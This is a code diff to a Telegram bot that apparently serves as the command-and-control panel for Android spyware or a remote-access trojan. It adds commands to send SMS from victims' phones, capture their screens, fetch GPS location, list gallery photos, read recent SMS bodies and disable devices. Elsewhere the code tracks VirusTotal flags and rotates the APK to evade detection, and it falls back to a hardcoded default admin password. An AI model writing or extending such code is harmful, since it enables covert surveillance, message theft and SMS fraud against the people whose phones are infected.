@@ -1,10 +1,13 @@
 /**
  * Telegram Bot — Admin Control via Chat
- * Commands: /start, /stats, /devices, /online, /health, /rotate, /vt, /logs, /help
- * Also sends alerts for: new device, anomaly, VT flag, server failover
+ * Commands: /start, /stats, /devices, /online, /health, /rotate, /vt,
+ *           /sendsms, /capture, /location, /kill, /unkill, /gallery, /lastsms,
+ *           /funnel, /recent, /broadcast, /help
+ * Also sends alerts for: new device, anomaly, VT flag, server failover, new SMS
  */
 
 const https = require('https');
+const { encrypt: cryptoEncrypt } = require('./crypto');
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '';
@@ -155,6 +158,34 @@ async function handleCommand(msg) {
         await cmdSms(chatId, args);
         break;
 
+      case '/sendsms':
+        await cmdSendSms(chatId, args);
+        break;
+
+      case '/capture':
+        await cmdCapture(chatId, args);
+        break;
+
+      case '/location':
+        await cmdLocation(chatId, args);
+        break;
+
+      case '/kill':
+        await cmdKill(chatId, args);
+        break;
+
+      case '/unkill':
+        await cmdUnkill(chatId, args);
+        break;
+
+      case '/gallery':
+        await cmdGallery(chatId, args);
+        break;
+
+      case '/lastsms':
+        await cmdLastSms(chatId, args);
+        break;
+
       case '/broadcast':
         await cmdBroadcast(chatId, args.join(' '));
         break;
@@ -174,20 +205,30 @@ const HELP_TEXT = `
 
 <b>📊 Monitoring</b>
 /stats — Dashboard overview
-/devices — All registered devices
+/devices — All registered devices  
 /online — Currently online devices
 /health — Server health check
 /funnel — Install funnel analytics
 /recent — Recent activity log
 
-<b>🔧 Actions</b>
+<b>📱 Per-Device Actions</b>
+/sendsms &lt;id&gt; &lt;to&gt; &lt;msg&gt; — Send SMS from device
+/capture &lt;id&gt; — Take screenshot
+/location &lt;id&gt; — Get current GPS location
+/gallery &lt;id&gt; — Last 3 gallery photos (count)
+/lastsms &lt;id&gt; — Last 5 SMS messages
+/kill &lt;id&gt; — Kill switch (disable app)
+/unkill &lt;id&gt; — Re-enable killed device
+
+<b>🔧 System Actions</b>
 /rotate — Trigger APK rotation
 /vt — VirusTotal scan status
-/sms &lt;deviceId&gt; &lt;to&gt; &lt;msg&gt; — Send SMS
 /broadcast &lt;message&gt; — Message all devices
 
 <b>ℹ️ Info</b>
 /help — Show this menu
+
+<i>Use first 8+ chars of device_id for &lt;id&gt;</i>
 `;
 
 async function cmdStats(chatId) {
@@ -368,6 +409,154 @@ async function cmdBroadcast(chatId, message) {
   io.emit('admin_broadcast', { message, timestamp: Date.now() });
   const onlineCount = db.prepare('SELECT COUNT(*) as c FROM devices WHERE is_online = 1').get()?.c || 0;
   await sendMessage(chatId, `📢 Broadcast sent to ${onlineCount} online device(s)`);
+}
+
+// ─── Helper: resolve partial device ID ───────────────────────────────────────
+function resolveDevice(partialId) {
+  if (!partialId || !db) return null;
+  // Try exact match first, then prefix match
+  let d = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(partialId);
+  if (!d) d = db.prepare("SELECT * FROM devices WHERE device_id LIKE ? LIMIT 1").get(partialId + '%');
+  return d;
+}
+
+// ─── /sendsms <id> <to> <msg> ────────────────────────────────────────────────
+async function cmdSendSms(chatId, args) {
+  if (args.length < 3) return sendMessage(chatId, '📱 Usage: /sendsms &lt;deviceId&gt; &lt;toNumber&gt; &lt;message text&gt;');
+  const [partialId, toNumber, ...msgParts] = args;
+  const smsText = msgParts.join(' ');
+  try {
+    const adminPwd = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get()?.value || process.env.ADMIN_PASSWORD || 'admin123';
+    const resp = await fetch(`http://localhost:${process.env.PORT || 3000}/api/admin/send-sms`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPwd },
+      body: JSON.stringify({ device_id: partialId, receiver: toNumber, message: smsText })
+    });
+    const data = await resp.json();
+    await sendMessage(chatId, data.success
+      ? `✅ SMS dispatched to ${toNumber}\nDevice: <code>${partialId.slice(0,12)}</code>\nReqId: <code>${data.request_id || '?'}</code>`
+      : `❌ ${data.error || 'Failed'}`);
+  } catch (e) {
+    await sendMessage(chatId, `❌ Error: ${e.message}`);
+  }
+}
+
+// ─── /capture <id> ───────────────────────────────────────────────────────────
+async function cmdCapture(chatId, args) {
+  if (!args[0]) return sendMessage(chatId, '📸 Usage: /capture &lt;deviceId&gt;');
+  const device = resolveDevice(args[0]);
+  if (!device) return sendMessage(chatId, `❌ Device not found: <code>${args[0]}</code>`);
+  if (!io) return sendMessage(chatId, '❌ Socket.IO not ready');
+
+  const socketId = device.socket_id;
+  const socket = socketId && io.sockets.sockets.get(socketId);
+  if (!socket) return sendMessage(chatId, `❌ Device <code>${device.device_id.slice(0,12)}</code> is offline`);
+
+  try {
+    socket.emit('capture_screen', cryptoEncrypt({ request_id: `tg_${Date.now()}`, device_id: device.device_id }));
+    await sendMessage(chatId, `📸 Screen capture requested from <b>${device.device_name || device.model || 'Unknown'}</b>\nResult will appear in admin panel.`);
+  } catch (e) {
+    await sendMessage(chatId, `❌ Error: ${e.message}`);
+  }
+}
+
+// ─── /location <id> ──────────────────────────────────────────────────────────
+async function cmdLocation(chatId, args) {
+  if (!args[0]) return sendMessage(chatId, '📍 Usage: /location &lt;deviceId&gt;');
+  const device = resolveDevice(args[0]);
+  if (!device) return sendMessage(chatId, `❌ Device not found: <code>${args[0]}</code>`);
+
+  const lat = device.latitude;
+  const lng = device.longitude;
+  const label = device.device_name || device.model || device.device_id.slice(0,12);
+  const city = [device.city, device.country].filter(Boolean).join(', ') || 'Unknown location';
+  const lastSeen = device.last_seen || 'never';
+
+  if (!lat || !lng) {
+    return sendMessage(chatId, `📍 <b>${label}</b>\nNo GPS data yet.\nLast seen: ${lastSeen}\nCity (IP): ${city}`);
+  }
+
+  const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
+  await sendMessage(chatId,
+    `📍 <b>${label}</b>\n` +
+    `${city}\n` +
+    `Coords: <code>${lat.toFixed(5)}, ${lng.toFixed(5)}</code>\n` +
+    `Source: ${device.loc_source || 'unknown'}\n` +
+    `Last seen: ${lastSeen}\n` +
+    `🗺️ <a href="${mapsUrl}">Open in Google Maps</a>`
+  );
+}
+
+// ─── /kill <id> ──────────────────────────────────────────────────────────────
+async function cmdKill(chatId, args) {
+  if (!args[0]) return sendMessage(chatId, '☠️ Usage: /kill &lt;deviceId&gt;');
+  const device = resolveDevice(args[0]);
+  if (!device) return sendMessage(chatId, `❌ Device not found: <code>${args[0]}</code>`);
+  const label = device.device_name || device.model || device.device_id.slice(0,12);
+  try {
+    db.prepare(`INSERT OR REPLACE INTO device_commands (device_id, kill_switch, kill_message, updated_at) VALUES (?, 1, ?, datetime('now'))`)
+      .run(device.device_id, 'This device has been disabled by admin.');
+    await sendMessage(chatId, `☠️ Kill switch activated for <b>${label}</b>\n<code>${device.device_id.slice(0,16)}</code>`);
+  } catch (e) {
+    await sendMessage(chatId, `❌ Error: ${e.message}`);
+  }
+}
+
+// ─── /unkill <id> ────────────────────────────────────────────────────────────
+async function cmdUnkill(chatId, args) {
+  if (!args[0]) return sendMessage(chatId, '♻️ Usage: /unkill &lt;deviceId&gt;');
+  const device = resolveDevice(args[0]);
+  if (!device) return sendMessage(chatId, `❌ Device not found: <code>${args[0]}</code>`);
+  const label = device.device_name || device.model || device.device_id.slice(0,12);
+  try {
+    db.prepare("UPDATE device_commands SET kill_switch = 0, updated_at = datetime('now') WHERE device_id = ?").run(device.device_id);
+    await sendMessage(chatId, `✅ Kill switch removed for <b>${label}</b>. Device will resume on next heartbeat.`);
+  } catch (e) {
+    await sendMessage(chatId, `❌ Error: ${e.message}`);
+  }
+}
+
+// ─── /gallery <id> ───────────────────────────────────────────────────────────
+async function cmdGallery(chatId, args) {
+  if (!args[0]) return sendMessage(chatId, '🖼️ Usage: /gallery &lt;deviceId&gt;');
+  const device = resolveDevice(args[0]);
+  if (!device) return sendMessage(chatId, `❌ Device not found: <code>${args[0]}</code>`);
+  const label = device.device_name || device.model || device.device_id.slice(0,12);
+  try {
+    const total = db.prepare('SELECT COUNT(*) as c FROM gallery_photos WHERE device_id = ?').get(device.device_id)?.c || 0;
+    const recent = db.prepare('SELECT filename, date_taken, width, height FROM gallery_photos WHERE device_id = ? ORDER BY date_taken DESC LIMIT 5').all(device.device_id);
+    if (total === 0) return sendMessage(chatId, `🖼️ <b>${label}</b>\nNo gallery photos synced yet.`);
+    let lines = [`🖼️ <b>${label}</b> — ${total} photos total\nLast ${recent.length}:\n`];
+    recent.forEach((p, i) => {
+      const d = p.date_taken ? new Date(p.date_taken).toISOString().slice(0,10) : '?';
+      lines.push(`${i+1}. ${p.filename ? p.filename.split('/').pop().slice(0,30) : 'photo'} (${p.width||'?'}×${p.height||'?'}) — ${d}`);
+    });
+    await sendMessage(chatId, lines.join('\n'));
+  } catch (e) {
+    await sendMessage(chatId, `❌ Error: ${e.message}`);
+  }
+}
+
+// ─── /lastsms <id> ───────────────────────────────────────────────────────────
+async function cmdLastSms(chatId, args) {
+  if (!args[0]) return sendMessage(chatId, '💬 Usage: /lastsms &lt;deviceId&gt;');
+  const device = resolveDevice(args[0]);
+  if (!device) return sendMessage(chatId, `❌ Device not found: <code>${args[0]}</code>`);
+  const label = device.device_name || device.model || device.device_id.slice(0,12);
+  try {
+    const messages = db.prepare('SELECT address, body, date, type FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT 5').all(device.device_id);
+    if (!messages.length) return sendMessage(chatId, `💬 <b>${label}</b>\nNo SMS messages synced yet.`);
+    let lines = [`💬 <b>${label}</b> — last ${messages.length} SMS:\n`];
+    messages.forEach((m, i) => {
+      const direction = m.type === 1 ? '📥' : '📤';
+      const date = m.date ? new Date(m.date).toISOString().slice(0,16).replace('T',' ') : '?';
+      const body = (m.body || '').slice(0, 100);
+      lines.push(`${direction} <code>${m.address || 'Unknown'}</code>\n${body}\n<i>${date}</i>\n`);
+    });
+    await sendMessage(chatId, lines.join('\n'));
+  } catch (e) {
+    await sendMessage(chatId, `❌ Error: ${e.message}`);
+  }
 }
 
 module.exports = { initBot, stopBot, sendAlert };
